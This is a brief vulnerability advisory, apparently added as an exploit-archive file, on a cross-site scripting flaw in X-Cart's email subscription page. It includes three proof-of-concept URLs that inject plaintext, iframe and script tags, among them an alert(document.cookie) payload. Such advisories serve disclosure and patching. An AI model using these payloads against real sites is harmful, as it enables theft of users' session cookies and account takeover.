@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/36601/info
+
+X-Cart is prone to a cross-site scripting vulnerability in the email subscription component because the application fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks. 
+
+http://www.example.com/[path]/customer/home.php?mode=subscribed&email=<plaintext/>
+http://www.example.com/[path]/customer/home.php?mode=subscribed&email=<script>alert(document.cookie);//<</script>
+http://www.example.com/[path]/customer/home.php?mode=subscribed&email=<iframe src=http://www.google.com.br width=800>
